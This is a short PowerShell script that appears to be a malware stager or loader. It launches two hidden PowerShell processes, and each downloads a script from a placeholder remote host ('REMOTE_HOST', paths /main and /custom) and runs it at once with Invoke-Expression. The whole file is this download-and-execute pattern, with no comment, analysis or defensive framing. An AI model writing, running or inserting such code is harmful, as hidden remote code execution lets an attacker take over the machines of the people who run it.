$remoteHost = "REMOTE_HOST"
$baseUri = "https://" + $remoteHost
Start-Process -FilePath powershell.exe -ArgumentList "-Command `"Invoke-Expression -Command (Invoke-RestMethod -Uri $baseUri/main)`"" -WindowStyle Hidden
Start-Process -FilePath powershell.exe -ArgumentList "-Command `"Invoke-Expression -Command (Invoke-RestMethod -Uri $baseUri/custom)`"" -WindowStyle Hidden
